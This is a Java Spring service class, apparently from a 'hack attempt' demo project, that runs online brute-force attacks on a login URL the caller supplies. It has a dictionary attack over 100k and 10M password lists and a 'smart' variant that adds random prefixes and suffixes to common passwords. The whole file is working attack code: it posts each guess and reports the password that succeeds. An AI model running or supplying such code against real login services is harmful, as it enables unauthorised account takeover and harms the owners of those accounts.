package com.example.hackAttemptService.service;

import com.example.hackAttemptService.model.BruteForceRequest;
import com.example.hackAttemptService.model.BruteForceResult;
import com.example.hackAttemptService.model.LoginRequest;
import lombok.RequiredArgsConstructor;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.List;
import java.util.Random;

@Service
@RequiredArgsConstructor
public class PasswordService {

    private final RestTemplate restTemplate = new RestTemplate();

    // ========== 1. SMART ATTACK ==========
    public BruteForceResult performSmartAttack(BruteForceRequest bruteForceRequest, int baseChancePercent) {
        List<String> dictionary = PasswordLoader.loadFromResource("100k-passwords.txt");

        if (dictionary == null || dictionary.isEmpty()) {
            System.err.println("Password list is empty or couldn't be loaded!");
            return new BruteForceResult(false, null, 0, 0);
        }

        int attempts = 0;
        long start = System.currentTimeMillis();
        Random random = new Random();

        for (String baseWord : dictionary) {
            if (attempts >= bruteForceRequest.getMaxAtt()) break;
            attempts++;

            String passwordToTry = getPasswordToTry(baseWord, random, baseChancePercent);

            if (tryLogin(bruteForceRequest, passwordToTry)) {
                long duration = System.currentTimeMillis() - start;
                System.out.println("✅ SUCCESS! Found password: '" + passwordToTry + "'");
                return new BruteForceResult(true, passwordToTry, attempts, duration);
            }
        }

        long duration = System.currentTimeMillis() - start;
        System.out.println("❌ Attack failed after " + attempts + " attempts.");
        return new BruteForceResult(false, null, attempts, duration);
    }

    private String getPasswordToTry(String baseWord, Random random, int baseChancePercent) {
        boolean useBase = random.nextInt(100) < baseChancePercent;
        return useBase ? baseWord : mutatePassword(baseWord, random);
    }

    public BruteForceResult performPureDictionaryAttack (BruteForceRequest bruteForceRequest){
        List<String> passwordFiles = List.of("100k-passwords.txt", "10M-passwords.txt");
        return performPureDictionaryAttackMultiFile(bruteForceRequest, passwordFiles);
    }

    // ========== 2. PURE DICTIONARY ATTACK ==========
    private BruteForceResult performPureDictionaryAttackMultiFile(BruteForceRequest request, List<String> filenames) {
        List<String> allPasswords = PasswordLoader.loadMultiple(filenames);

        if (allPasswords.isEmpty()) {
            System.err.println("No passwords found from provided files.");
            return new BruteForceResult(false, null, 0, 0);
        }

        return tryPasswordsFromList(request, allPasswords);
    }

    private BruteForceResult tryPasswordsFromList(BruteForceRequest request, List<String> passwords) {
        int attempts = 0;
        long start = System.currentTimeMillis();

        for (String password : passwords) {
            if (attempts >= request.getMaxAtt()) break;
            attempts++;

            if (tryLogin(request, password)) {
                long duration = System.currentTimeMillis() - start;
                System.out.println("✅ SUCCESS! Found password: '" + password + "'");
                return new BruteForceResult(true, password, attempts, duration);
            }
        }

        long duration = System.currentTimeMillis() - start;
        System.out.println("❌ Attack failed after " + attempts + " attempts.");
        return new BruteForceResult(false, null, attempts, duration);
    }

    private boolean tryLogin(BruteForceRequest request, String password) {
        try {
            LoginRequest login = new LoginRequest();
            login.setUsername(request.getUsername());
            login.setPassword(password);

            System.out.println("🔍 Attempting password: '" + password + "'");

            // Send the login request
            ResponseEntity<String> response = restTemplate.postForEntity(
                    request.getTargetUrl(), login, String.class);

            // Check if login was successful
            return response.getStatusCode() == HttpStatus.OK;

        } catch (HttpClientErrorException.Unauthorized e) {
            // Expected error when password is incorrect
            return false;
        } catch (Exception e) {
            // Handle other exceptions
            System.err.println("⚠️ Error with '" + password + "': " + e.getMessage());
            return false;
        }
    }

    // ========== HELPERS ==========
    private String mutatePassword(String baseWord, Random random) {
        String prefix = generateRandomString(1, random);
        String suffix = generateRandomString(2, random);
        int mutationType = random.nextInt(3);

        return switch (mutationType) {
            case 0 -> baseWord + suffix;
            case 1 -> prefix + baseWord;
            case 2 -> prefix + baseWord + suffix;
            default -> baseWord;
        };
    }

    private String generateRandomString(int length, Random random) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }
}
